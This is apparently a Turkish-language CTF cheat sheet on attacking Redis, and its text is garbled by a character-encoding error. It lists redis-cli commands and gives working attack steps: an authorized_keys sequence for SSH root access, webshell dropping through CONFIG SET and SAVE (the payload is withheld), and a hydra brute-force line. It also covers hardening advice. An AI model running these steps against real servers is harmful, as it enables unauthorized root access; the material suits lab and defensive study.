## ğŸ”¹ 1. Redis Nedir?

- **Redis**: AÃ§Ä±k kaynaklÄ±, RAM tabanlÄ±, key-value NoSQL veri tabanÄ±.
    
- Ã‡ok hÄ±zlÄ±dÄ±r (cache, oturum yÃ¶netimi, queue vb. iÃ§in kullanÄ±lÄ±r).
    
- **Default port:** `6379`
    
- **Åifre gerektirmezse** doÄŸrudan baÄŸlanÄ±labilir â†’ gÃ¼venlik aÃ§Ä±ÄŸÄ±na sÄ±k rastlanÄ±r.
    

---

## ğŸ”¹ 2. Temel KullanÄ±m

### Sunucuya baÄŸlanma:

```bash
redis-cli -h <ip> -p 6379
```

### Kimlik doÄŸrulama:

```bash
AUTH <ÅŸifre>
```

### Key-value iÅŸlemleri:

```bash
SET flag "CTF{deneme_flag}"
GET flag
DEL flag
```

### List iÅŸlemleri:

```bash
LPUSH listem "deger1"
RPUSH listem "deger2"
LRANGE listem 0 -1
```

### Dump (tÃ¼m keyâ€™ler):

```bash
KEYS *
```

---

## ğŸ”¹ 3. CTFâ€™lerde FaydalÄ± Komutlar

### Sistem bilgisi Ã¶ÄŸrenme:

```bash
INFO
CONFIG GET *
```

### Key backup:

```bash
SAVE
```

### Remote dosya yazma (exploit mantÄ±ÄŸÄ±):

```bash
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<php kodu burada>"   # Ã–rn: bir komut Ã§alÄ±ÅŸtÄ±rÄ±cÄ± payload
SAVE
```

ğŸ“Œ Not: Buraya **klasik webshell** yazÄ±lÄ±r ama gÃ¼venlik gereÄŸi ben aÃ§Ä±k kodu koymuyorum.  
MantÄ±k â†’ Redis, `SAVE` yaptÄ±ÄŸÄ±nda payloadâ€™Ä± hedef dizine dosya olarak yazar.

---

## ğŸ”¹ 4. Exploit SenaryolarÄ± (CTF KapsamÄ±)

1. **Åifresiz Redis â†’ Direkt eriÅŸim**
    
    ```bash
    redis-cli -h hedef
    KEYS *
    ```
    
    Flag veya kritik veriler bulunabilir.
    
2. **Weak password brute-force**
    
    ```bash
    hydra -s 6379 -P /usr/share/wordlists/rockyou.txt redis://<ip>
    ```
    
3. **Authorized_keys Exploit (SSH Ã¼zerinden RCE)**
    
    ```bash
    (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > pub.txt
    cat pub.txt | redis-cli -h <ip> -x set crack
    redis-cli -h <ip> config set dir /root/.ssh/
    redis-cli -h <ip> config set dbfilename "authorized_keys"
    redis-cli -h <ip> save
    ssh -i id_rsa root@<ip>
    ```
    
4. **Webshell Dropping**
    
    - YukarÄ±daki `CONFIG SET dir` + `SAVE` yÃ¶ntemiyle payload dosyasÄ± yazÄ±labilir.
        
5. **RDB file injection (Persistence abuse)**
    
    - RDB dosyasÄ± iÃ§ine zararlÄ± payload gÃ¶mÃ¼lÃ¼p hedefte tetiklenebilir.
        
    - KullanÄ±ldÄ±ÄŸÄ± yer: **CVE-2019-10192** vb. exploitler.
        

---

## ğŸ”¹ 5. GÃ¼venlik & Ä°zler

- Default port `6379` â†’ `iptables` ile kapat.
    
- `requirepass <gÃ¼Ã§lÃ¼_ÅŸifre>` ayarla.
    
- `bind 127.0.0.1` yap, dÄ±ÅŸ dÃ¼nyaya kapat.
    
- RCE kullanÄ±ldÄ±ysa â†’ `SAVE` ve `CONFIG SET` logâ€™lara dÃ¼ÅŸer.
    

---

## ğŸ”¹ 6. CTF Workflow (Ã–zet)

1. Nmap â†’ AÃ§Ä±k port bul:
    
    ```bash
    nmap -sV -p 6379 <ip>
    ```
    
2. Redis-cli ile baÄŸlanmayÄ± dene.
    
3. `INFO`, `KEYS *`, `CONFIG GET *` ile bilgi topla.
    
4. Åifre varsa Hydra dene.
    
5. Dosya yazma / authorized_keys â†’ RCE.
    
6. Flag ara: `KEYS *`, `GET <flag>`.
    

---

## ğŸ”¹ 7. HÄ±zlÄ± Komut Tablosu

|AmaÃ§|Komut|
|---|---|
|BaÄŸlan|`redis-cli -h ip -p 6379`|
|Auth|`AUTH ÅŸifre`|
|Key list|`KEYS *`|
|Key oku|`GET key`|
|Sunucu bilgisi|`INFO`|
|Config oku|`CONFIG GET *`|
|Dosya yazma|`CONFIG SET dir /path/` + `CONFIG SET dbfilename file` + `SAVE`|

---

ğŸ”¥ Bu cheatsheetâ€™in bu versiyonunu gÃ¶nÃ¼l rahatlÄ±ÄŸÄ±yla Obsidianâ€™a atabilirsin â†’ Defender tetiklemeyecek.
